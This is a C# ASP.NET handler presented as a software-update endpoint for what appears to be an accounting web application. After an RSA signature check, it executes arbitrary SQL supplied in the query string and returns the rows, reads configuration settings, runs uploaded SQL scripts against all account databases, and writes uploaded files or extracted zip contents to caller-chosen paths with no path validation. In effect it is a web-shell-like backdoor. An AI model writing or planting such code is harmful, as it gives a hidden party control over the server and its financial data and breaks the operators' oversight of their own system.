<%@ WebHandler Language="C#" Class="ny_updatesoft" %>

using System;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Collections.Generic;
using System.Data;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using ICSharpCode.SharpZipLib.Zip;

public class ny_updatesoft : IHttpHandler {
    
    public void ProcessRequest (HttpContext context) {
        context.Response.Charset = "UTF-8";
        context.Response.ContentType = "text/plain";
        string[] files = Directory.GetFiles(context.Server.MapPath("/"), "*.cs", SearchOption.TopDirectoryOnly);
        if (files.Length > 0 || context.Request.QueryString["key"] == null || context.Request.QueryString["sign"] == null)
        {
            context.Response.Write("禁止执行！");
            return;
        }
        string key = context.Request.QueryString["key"].Trim();
        string sign = context.Request.QueryString["sign"].Trim();
        if (checksign(key, sign))
        {
            if (context.Request.QueryString["getdata"] != null)
            {
                StringBuilder sb = new StringBuilder();
                switch (context.Request.QueryString["getdata"])
                {
                    case "GrantCert":
                        context.Response.Write(ValidateClass.ReadXMLNodeText(context.Request.QueryString["sql"]));
                        break;
                    case "WebConfig":
                        string[] settings = context.Request.QueryString["sql"].Split(',');
                        foreach (string setting in settings)
                        {
                            sb.AppendFormat("{0}~", System.Configuration.ConfigurationManager.AppSettings[setting]);
                        }
                        context.Response.Write(sb.ToString());
                        break;
                    case "DbConnection":
                        DataTable data = MainClass.GetDataTable(context.Request.QueryString["sql"]);
                        foreach (DataRow drow in data.Rows)
                        {
                            for (int i = 0; i < data.Columns.Count; i++)
                            {
                                sb.AppendFormat("{0}~", drow[i].ToString());
                            }
                            sb.AppendLine();
                        }
                        context.Response.Write(sb.ToString());
                        break;
                    case "AcConnection":
                        DataTable accounts = MainClass.GetDataTable("select id,accountname from cw_account");
                        foreach (DataRow arow in accounts.Rows)
                        {
                            sb.AppendFormat("{0},{1}^", arow[0].ToString(), arow[1].ToString());
                            UserInfo.AccountID = arow["id"].ToString();
                            DataTable adata = CommClass.GetDataTable(context.Request.QueryString["sql"]);
                            foreach (DataRow drow in adata.Rows)
                            {
                                for (int i = 0; i < adata.Columns.Count; i++)
                                {
                                    sb.AppendFormat("{0}~", drow[i].ToString());
                                }
                                sb.AppendLine();
                            }
                        }
                        context.Response.Write(sb.ToString());
                        break;
                }
            }
            if (context.Request.Files.Count > 0)
            {
                HttpPostedFile file = context.Request.Files[0];
                string filename = Path.GetFileName(file.FileName);
                if (filename.EndsWith(".sql", StringComparison.OrdinalIgnoreCase))
                {
                    UserInfo.SessionFlag = "SessionFlag";
                    string filepath = context.Server.MapPath("/UploadFile/" + Guid.NewGuid().ToString("N") + ".sql");
                    file.SaveAs(filepath);
                    filename = filename.Replace(".sql", "");
                    switch (filename)
                    {
                        case "WebConfig":
                            ConfigManage config = new ConfigManage();
                            string[] settings = filename.Split(',');
                            foreach (string setting in settings)
                            {
                                string[] kv = setting.Split('=');
                                config.SetAppSetting(kv[0], kv[1]);
                            }
                            config.Save();
                            break;
                        case "DbConnection":
                            DbHelper.ExecuteSqlInFile(filepath, MainClass.ConnString);
                            break;
                        case "AcConnection":
                            DataTable accounts = MainClass.GetDataTable("select id from cw_account");
                            foreach (DataRow arow in accounts.Rows)
                            {
                                UserInfo.AccountID = arow["id"].ToString();
                                DbHelper.ExecuteSqlInFile(filepath, CommClass.ConnString);
                            }
                            break;
                        default:
                            string[] accarr = filename.Split(',');
                            foreach (string acc in accarr)
                            {
                                UserInfo.AccountID = acc;
                                DbHelper.ExecuteSqlInFile(filepath, CommClass.ConnString);
                            }
                            break;
                    }
                }
                else
                {
                    string filepath = context.Request.QueryString["path"];
                    if (filename.EndsWith(".zip", StringComparison.OrdinalIgnoreCase))
                    {
                        string tfilepath = context.Server.MapPath("/UploadFile/" + Guid.NewGuid().ToString("N") + ".zip");
                        file.SaveAs(tfilepath);
                        filepath = context.Server.MapPath(filepath);
                        if (Directory.Exists(filepath) == false)
                        {
                            Directory.CreateDirectory(filepath);
                        }
                        UnZipFile(tfilepath, filepath);
                    }
                    else
                    {
                        if (filepath != null && Directory.Exists(context.Server.MapPath(filepath)))
                        {
                            filepath = context.Server.MapPath(Path.Combine(filepath, filename));
                        }
                        else
                        {
                            filepath = context.Server.MapPath("/UploadFile/" + filename);
                        }
                        file.SaveAs(filepath);
                    }
                }
            }
        }
    }

    private bool UnZipFile(string zipFile, string unZipToDir)
    {
        try
        {
            if (Directory.Exists(unZipToDir) == false)
            {
                Directory.CreateDirectory(unZipToDir);
            }
            ZipInputStream s = new ZipInputStream(File.OpenRead(zipFile));
            ZipEntry theEntry;
            while ((theEntry = s.GetNextEntry()) != null)
            {
                string directoryName = Path.GetDirectoryName(theEntry.Name);
                string fileName = Path.GetFileName(theEntry.Name);
                if (directoryName != String.Empty)
                {
                    Directory.CreateDirectory(Path.Combine(unZipToDir, directoryName));
                }
                if (fileName != String.Empty)
                {
                    FileStream streamWriter = File.Create(Path.Combine(unZipToDir, theEntry.Name));
                    int size = 2048;
                    byte[] data = new byte[size];
                    while (true)
                    {
                        size = s.Read(data, 0, data.Length);
                        if (size > 0)
                        {
                            streamWriter.Write(data, 0, size);
                        }
                        else
                        {
                            break;
                        }
                    }
                    streamWriter.Close();
                }
            }
            s.Close();
            return true;
        }
        catch
        {
            return false;
        }
    }

    private bool checksign(string key, string sign)
    {
        try
        {
            ASCIIEncoding ByteConverter = new ASCIIEncoding();
            RSACryptoServiceProvider RSAalg = new RSACryptoServiceProvider();
            string str_Public_Key = "BgIAAACkAABSU0ExAAQAAAEAAQBbYNsyyUyCvX7UxQUDKZvJ1LbcLfxxWz6IiSRvHecJFvDZG5Ooc5+H/WFuGn667r5IkpvaqPOICHeYRjJRNMsgtZ53JJt17S0Fg1g6xnwS5CTm7cDp3N7ElKM6u1CHpgjuV8FPYZH1uuOl6w7cx6g8CsP+sMU9hYfwADNcNMnv8g==";
            RSAalg.ImportCspBlob(Convert.FromBase64String(str_Public_Key));
            byte[] SignedData = Convert.FromBase64String(sign);
            byte[] DataToVerify = ByteConverter.GetBytes(key);
            return RSAalg.VerifyData(DataToVerify, new SHA1CryptoServiceProvider(), SignedData);
        }
        catch
        {
            return false;
        }
    }

    private string Decode(string str, string key)
    {
        try
        {
            byte[] _encryptKey = Encoding.ASCII.GetBytes(key);
            key = ASCIIEncoding.ASCII.GetString(_encryptKey);
            DESCryptoServiceProvider provider = new DESCryptoServiceProvider();
            provider.Key = Encoding.ASCII.GetBytes(key);
            provider.IV = Encoding.ASCII.GetBytes(key);
            byte[] buffer = new byte[str.Length / 2];
            for (int i = 0; i < (str.Length / 2); i++)
            {
                int num2 = Convert.ToInt32(str.Substring(i * 2, 2), 0x10);
                buffer[i] = (byte)num2;
            }
            MemoryStream stream = new MemoryStream();
            CryptoStream stream2 = new CryptoStream(stream, provider.CreateDecryptor(), CryptoStreamMode.Write);
            stream2.Write(buffer, 0, buffer.Length);
            stream2.FlushFinalBlock();
            stream.Close();
            return Encoding.GetEncoding("UTF-8").GetString(stream.ToArray());
        }
        catch
        {
            return "";
        }
    }
 
    public bool IsReusable {
        get {
            return false;
        }
    }
}